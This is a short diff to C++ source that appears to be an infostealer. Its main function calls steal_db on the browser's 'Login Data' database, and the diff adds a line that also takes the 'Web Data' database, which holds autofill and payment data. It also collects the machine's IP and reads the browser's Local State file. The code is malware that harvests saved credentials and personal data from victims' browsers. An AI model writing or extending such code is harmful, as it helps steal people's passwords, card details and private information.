@@ -81,6 +81,7 @@ int main() {
         {
 
             steal_db(definitions::browser + "Default\\Login Data");
+            steal_db(definitions::browser + "Default\\Web Data");
             get_ip();
             json localstate_json = read_local_state();
             check_json(localstate_json);
